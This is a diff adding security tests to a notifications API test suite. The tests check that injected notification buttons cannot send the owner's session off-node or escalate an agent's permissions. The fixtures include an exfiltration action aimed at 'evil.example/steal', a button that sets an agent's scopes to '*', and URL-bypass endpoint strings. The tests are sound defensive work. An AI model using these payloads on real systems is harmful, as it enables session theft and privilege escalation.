@@ -6,6 +6,10 @@
  *   without notifications:send gets 403), mark-read, the inline-actions security invariant (a
  *   client-supplied actions field is rejected), and the DM reply action end-to-end.
  * @version-history
+ *   v1.4.0 — 2026-09-25 — A notification's buttons are the node's own (tests 24–30). No principal
+ *     writes a `notif.` record on any memory door (the agent writing as its owner, the owner, an app
+ *     grant), a record planted straight into storage is served without its off-node buttons, and the
+ *     node's own join request, invitation and workspace access request still carry buttons that run.
  *   v1.3.0 — 2026-08-30 — The Notifications page in the poster face: rows carry source and group,
  *     the settings record (defaults, normalisation, owner only), a muted group drops before the
  *     write, the senders read, localized words on a message, the devices list (tests 15–20).
@@ -35,7 +39,10 @@ async function json(path: string, opts: RequestInit = {}) {
 }
 
 import * as ed from '@noble/ed25519';
-import { createHash } from 'node:crypto';
+import { createHash, randomBytes } from 'node:crypto';
+import { createStorage, type StorageProvider } from '../src/storage/storage-factory.js';
+import type { Storage } from '../src/storage/interface.js';
+import { serverSqlitePath, serverDbUrl } from './helpers/server-db.js';
 ed.hashes.sha512 = (m: Uint8Array) => new Uint8Array(createHash('sha512').update(m).digest());
 async function sign(privB64: string, msg: string): Promise<string> {
     return Buffer.from(await ed.signAsync(new TextEncoder().encode(msg), Buffer.from(privB64, 'base64'))).toString('base64');
@@ -310,6 +317,178 @@ await test('22. The mail log is the owner\'s own, empty on a node that sends no 
 await test('23. The email chat prompt is served with the owner\'s name', async () => {
     const r = await json('/v1/templates/email-mcp', { headers: auth(A.token) });
     assert(r.status === 200 && r.body.data.prompt.includes(A.name) && r.body.data.prompt.includes('aimeat_mail_send'), `template ${r.status}`);
+});
+
+
+// -- A notification's buttons are the node's own (2026-09-25). The owner's browser runs an `api`
+//    button with the owner's session: the bell, the Notifications page and a push click. So only the
+//    node writes a notification record, and it serves a button only when it points at its own API. --
+
+const STEAL = { id: 'steal', label: 'Open', kind: 'api', method: 'POST', endpoint: 'https://evil.example/steal' };
+const planted = (tag: string, actions: unknown[]) => ({
+    id: `planted-${tag}-${Date.now()}`, type: 'custom', title: `Planted ${tag}`, body: '', link: '', read: false,
+    createdAt: new Date().toISOString(), actions,
+});
+const plantedTitles = async (token: string) => ((await json('/v1/notifications?limit=200', { headers: auth(token) })).body.data.notifications || [])
+    .filter((n: any) => typeof n.title === 'string' && n.title.startsWith('Planted '))
+    .map((n: any) => n.title as string);
+
+let agentName = '', agentToken = '', appToken = '';
+
+await test('24. Setup: an agent of A that may write into A\'s namespace, and an app A granted memory:write', async () => {
+    agentName = `notifbot${Date.now() % 100000}`;
+    const ag = await json('/v1/agents', {
+        method: 'POST', headers: auth(A.token),
+        body: JSON.stringify({ name: agentName, owner: A.name, capabilities: ['memory'], scopes: ['memory:read', 'memory:write'] }),
+    });
+    assert(ag.status === 201, `register agent ${ag.status}: ${JSON.stringify(ag.body.error)}`);
+    const gaii = ag.body.data.agent.gaii as string;
+    const p = await json(`/v1/agents/${agentName}/scopes`, {
+        method: 'PATCH', headers: auth(A.token),
+        body: JSON.stringify({ scopes: ['memory:read', 'memory:write', 'memory:write-as-owner'] }),
+    });
+    assert(p.status === 200, `grant write-as-owner ${p.status}: ${JSON.stringify(p.body.error)}`);
+    const ts = new Date().toISOString();
+    const tok = await json('/v1/auth/token', { method: 'POST', body: JSON.stringify({ gaii, timestamp: ts, signature: await sign(ag.body.data.private_key, gaii + ts) }) });
+    assert(tok.body.ok === true, `agent token: ${JSON.stringify(tok.body.error)}`);
+    agentToken = tok.body.data.token;
+
+    const filename = `notif-probe-${Date.now() % 100000}.html`;
+    const pub = await json('/v1/apps', {
+        method: 'POST', headers: auth(A.token),
+        body: JSON.stringify({ filename, content: Buffer.from('<!DOCTYPE html><html><body>probe</body></html>').toString('base64'), name: 'Notif Probe', description: 'probe', category: 'utility' }),
+    });
+    assert(pub.status === 201, `publish app ${pub.status}: ${JSON.stringify(pub.body.error)}`);
+    const verifier = randomBytes(32).toString('base64url');
+    const challenge = createHash('sha256').update(verifier).digest('base64url');
+    const redirect = 'http://localhost:9911/callback';
+    const q = new URLSearchParams({ app: `${A.name}/${filename}`, response_type: 'code', scope: 'memory:read memory:write', redirect_uri: redirect, code_challenge: challenge, code_challenge_method: 'S256' });
+    const loc = (await fetch(`${BASE}/v1/app-grants/authorize?${q}`, { redirect: 'manual' })).headers.get('location') ?? '';
+    const rid = decodeURIComponent(/req=([^&]+)/.exec(loc)?.[1] ?? '');
+    const con = await json('/v1/app-grants/authorize-consent', { method: 'POST', headers: auth(A.token), body: JSON.stringify({ request_id: rid }) });
+    const code = new URL(con.body.data.redirect_url).searchParams.get('code') ?? '';
+    const at = await json('/v1/app-grants/token', { method: 'POST', body: JSON.stringify({ grant_type: 'authorization_code', code, code_verifier: verifier, redirect_uri: redirect }) });
+    assert(at.body.ok === true, `app token: ${JSON.stringify(at.body.error)}`);
+    appToken = at.body.data.access_token;
+});
+
+await test('25. SECURITY: an agent writing as its owner cannot plant a notification, with a button to another site or to an owner door', async () => {
+    const ownerDoor = { id: 'fix', label: 'Fix now', kind: 'api', method: 'PATCH', endpoint: `/v1/agents/${agentName}/scopes`, body: { scopes: ['*'] } };
+    for (const [tag, action] of [['steal', STEAL], ['ownerdoor', ownerDoor]] as const) {
+        const w = await json('/v1/memory', {
+            method: 'POST', headers: auth(agentToken),
+            body: JSON.stringify({ key: `notif.${new Date().toISOString()}.${tag}`, value: planted(tag, [action]), visibility: 'private', owner_scope: true }),
+        });
+        assert(w.status === 403 && w.body.error?.code === 'RESERVED_KEY', `${tag}: expected 403 RESERVED_KEY, got ${w.status} ${JSON.stringify(w.body.error ?? w.body.data)}`);
+    }
+});
+
+await test('26. SECURITY: the owner, and an app the owner granted, cannot write one either, on any memory door', async () => {
+    const key = () => `notif.${new Date().toISOString()}.${randomBytes(4).toString('hex')}`;
+    for (const [who, token] of [['owner', A.token], ['app', appToken]] as const) {
+        const post = await json('/v1/memory', { method: 'POST', headers: auth(token), body: JSON.stringify({ key: key(), value: planted(`${who}post`, [STEAL]), visibility: 'private' }) });
+        assert(post.status === 403 && post.body.error?.code === 'RESERVED_KEY', `${who} POST: ${post.status} ${JSON.stringify(post.body.error ?? post.body.data)}`);
+        const k = key();
+        const patch = await json(`/v1/memory/${encodeURIComponent(k)}`, { method: 'PATCH', headers: auth(token), body: JSON.stringify({ patch: planted(`${who}patch`, [STEAL]) }) });
+        assert(patch.status === 403 && patch.body.error?.code === 'RESERVED_KEY', `${who} PATCH: ${patch.status} ${JSON.stringify(patch.body.error ?? patch.body.data)}`);
+        const bulk = await json('/v1/memory/bulk', { method: 'POST', headers: auth(token), body: JSON.stringify({ entries: [{ key: key(), value: planted(`${who}bulk`, [STEAL]) }] }) });
+        assert(bulk.status === 200 && bulk.body.data.created === 0 && bulk.body.data.failed.length === 1,
+            `${who} bulk: ${bulk.status} ${JSON.stringify(bulk.body.data ?? bulk.body.error)}`);
+        const imp = await json('/v1/memory/import', { method: 'POST', headers: auth(token), body: JSON.stringify({ entries: [{ key: key(), value: planted(`${who}import`, [STEAL]) }] }) });
+        assert(imp.status === 200 && imp.body.data.created === 0 && imp.body.data.failed.length === 1,
+            `${who} import: ${imp.status} ${JSON.stringify(imp.body.data ?? imp.body.error)}`);
+    }
+    // Nothing any of them tried reached the owner's inbox.
+    assert((await plantedTitles(A.token)).length === 0, `planted notifications were served: ${JSON.stringify(await plantedTitles(A.token))}`);
+});
+
+// A record that was written before the doors refused it, or by some path this suite does not know
+// about, still never hands the page a button that sends the session elsewhere. Planted straight into
+// the node's own database, the way an older record already sits there.
+await test('27. SECURITY: a record planted straight into storage is served without its off-node buttons', async () => {
+    const provider = (process.env.AIMEAT_DB ?? 'sqlite') as StorageProvider;
+    if (provider !== 'sqlite' && provider !== 'postgres-kysely') { console.log(`     (skipped: the ${provider} backend lives inside the server)`); return; }
+    const storage: Storage = await createStorage({ provider, sqlitePath: serverSqlitePath(), dbUrl: serverDbUrl() });
+    const now = new Date().toISOString();
+    const value = planted('instorage', [
+        STEAL,
+        { id: 'protocol', label: 'x', kind: 'api', method: 'POST', endpoint: '//evil.example/x' },
+        { id: 'backslash', label: 'x', kind: 'api', method: 'POST', endpoint: '/\\evil.example/x' },
+        { id: 'page', label: 'x', kind: 'api', method: 'POST', endpoint: '/spa.html' },
+        { id: 'escape', label: 'x', kind: 'api', method: 'POST', endpoint: '/v1/../spa.html' },
+        // The bell runs any button that is not a reply or a link as an api button.
+        { id: 'unknown', label: 'x', kind: 'webhook', method: 'POST', endpoint: 'https://evil.example/x' },
+        { id: 'approve', label: 'Approve', kind: 'api', method: 'POST', endpoint: '/v1/organisms/org-x/join-requests/jr-x/review', body: { decision: 'approved' } },
+        { id: 'view', label: 'View', kind: 'navigate', link: '/v1/profile#organisms' },
+    ]);
+    try {
+        await storage.setMemory({
+            key: `notif.${now}.instorag`, ownerGaii: ghiiOf(A.name), value, visibility: 'private', tags: ['notif'],
+            ttlHours: 24, version: 1, createdAt: now, updatedAt: now,
+        });
+    } finally { await storage.close?.(); }
+    const list = await json('/v1/notifications?limit=200', { headers: auth(A.token) });
+    const n = (list.body.data.notifications || []).find((x: any) => x.id === value.id);
+    assert(!!n, 'the planted record is still listed; only its buttons are judged');
+    const ids = (n.actions || []).map((a: any) => a.id);
+    assert(JSON.stringify(ids) === JSON.stringify(['approve', 'view']), `served buttons: ${JSON.stringify(ids)}`);
+    // Clear it so nothing below counts it.
+    await json('/v1/notifications', { method: 'DELETE', headers: auth(A.token), body: JSON.stringify({ ids: [value.id] }) });
+});
+
+// The node's own buttons are what the rule is for. Each is served, and runs the way the bell runs it:
+// the endpoint, the method and the body as served, with the clicker's own session.
+const runAs = (token: string, a: any) => json(a.endpoint, { method: a.method || 'POST', headers: auth(token), body: a.body ? JSON.stringify(a.body) : undefined });
+const newestOfType = async (token: string, type: string, endpointHas: string) => ((await json('/v1/notifications?limit=200', { headers: auth(token) })).body.data.notifications || [])
+    .find((n: any) => n.type === type && (n.actions || []).some((a: any) => typeof a.endpoint === 'string' && a.endpoint.includes(endpointHas)));
+
+await test('28. The node\'s own buttons still arrive and work: a join request, approved from the notification', async () => {
+    const o = await json('/v1/organisms', { method: 'POST', headers: auth(A.token), body: JSON.stringify({ name: 'Notif Join Org', description: 'x', type: 'project', join_policy: 'approval_required', visibility: 'public' }) });
+    assert(o.status === 201, `org ${o.status}: ${JSON.stringify(o.body.error)}`);
+    const orgId = o.body.data.organism.id as string;
+    const j = await json(`/v1/organisms/${orgId}/join`, { method: 'POST', headers: auth(B.token), body: JSON.stringify({ message: 'let me in' }) });
+    assert(j.status === 202, `join ${j.status}: ${JSON.stringify(j.body.error)}`);
+    const n = await newestOfType(A.token, 'organism_join_request', `/v1/organisms/${orgId}/`);
+    assert(!!n, 'A has the join request with its buttons');
+    assert(n.actions.map((a: any) => a.id).join(',') === 'approve,reject', `buttons: ${JSON.stringify(n.actions.map((a: any) => a.id))}`);
+    const r = await runAs(A.token, n.actions.find((a: any) => a.id === 'approve'));
+    assert(r.status === 200, `approve from the notification: ${r.status} ${JSON.stringify(r.body.error)}`);
+    const m = await json(`/v1/organisms/${orgId}/members`, { headers: auth(A.token) });
+    assert((m.body.data.members || []).some((x: any) => x.ghii === B.name && x.status === 'active'), 'B is an active member');
+});
+
+await test('29. ...an invitation, accepted from the notification', async () => {
+    const o = await json('/v1/organisms', { method: 'POST', headers: auth(A.token), body: JSON.stringify({ name: 'Notif Invite Org', description: 'x', type: 'project', join_policy: 'invite_only', visibility: 'public' }) });
+    assert(o.status === 201, `org ${o.status}`);
+    const orgId = o.body.data.organism.id as string;
+    const inv = await json(`/v1/organisms/${orgId}/invitations`, { method: 'POST', headers: auth(A.token), body: JSON.stringify({ invitee: B.name }) });
+    assert(inv.status === 201, `invite ${inv.status}: ${JSON.stringify(inv.body.error)}`);
+    const n = await newestOfType(B.token, 'organism_invitation', `/v1/organisms/${orgId}/`);
+    assert(!!n, 'B has the invitation with its buttons');
+    assert(n.actions.map((a: any) => a.id).join(',') === 'accept,decline', `buttons: ${JSON.stringify(n.actions.map((a: any) => a.id))}`);
+    const r = await runAs(B.token, n.actions.find((a: any) => a.id === 'accept'));
+    assert(r.status === 200 && r.body.data.status === 'joined', `accept from the notification: ${r.status} ${JSON.stringify(r.body.error)}`);
+});
+
+await test('30. ...a workspace access request, approved from the notification', async () => {
+    const o = await json('/v1/organisms', { method: 'POST', headers: auth(A.token), body: JSON.stringify({ name: 'Notif Access Org', description: 'x', type: 'project', join_policy: 'open', visibility: 'public' }) });
+    assert(o.status === 201, `org ${o.status}`);
+    const orgId = o.body.data.organism.id as string;
+    const ws = 'ws-notif';
+    await json('/v1/memory', { method: 'POST', headers: auth(A.token), body: JSON.stringify({ key: `organism.${orgId}.meta.workspaces`, value: { workspaces: [{ id: ws, name: 'Coordination', createdAt: new Date().toISOString(), createdBy: A.name }] }, visibility: 'private' }) });
+    const manifest = { manifestVersion: '1.0', id: orgId, name: 'Coordination', kind: 'project', status: 'active', objectTypes: [{ name: 'task', schemaRef: 'schema:task@1', namespace: 'shared.tasks', backing: 'memory', writeRole: 'member', cardinality: 'many', versioned: true, mode: 'records' }] };
+    const mr = await json('/v1/memory', { method: 'POST', headers: auth(A.token), body: JSON.stringify({ key: `organism.${orgId}.w.${ws}.meta.manifest`, value: manifest, visibility: 'private' }) });
+    assert(mr.status === 201, `manifest ${mr.status}: ${JSON.stringify(mr.body.error)}`);
+    // An open organism takes B in at once: 201 with the membership, where approval would be a 202.
+    const j = await json(`/v1/organisms/${orgId}/join`, { method: 'POST', headers: auth(B.token), body: '{}' });
+    assert(j.status === 201 && j.body.data.status === 'joined', `join ${j.status}: ${JSON.stringify(j.body.error ?? j.body.data)}`);
+    const req = await json(`/v1/organisms/${orgId}/workspace-access`, { method: 'POST', headers: auth(B.token), body: JSON.stringify({ ws, message: 'let me in' }) });
+    assert(req.status === 201, `request ${req.status}: ${JSON.stringify(req.body.error)}`);
+    const n = await newestOfType(A.token, 'workspace_access_request', `/v1/organisms/${orgId}/`);
+    assert(!!n, 'A has the access request with its buttons');
+    assert(n.actions.map((a: any) => a.id).join(',') === 'approve,deny', `buttons: ${JSON.stringify(n.actions.map((a: any) => a.id))}`);
+    const r = await runAs(A.token, n.actions.find((a: any) => a.id === 'approve'));
+    assert(r.status === 200 && r.body.data.status === 'approved', `approve from the notification: ${r.status} ${JSON.stringify(r.body.error)}`);
 });
 
 console.log(`\n${passed} passed, ${failed} failed\n`);
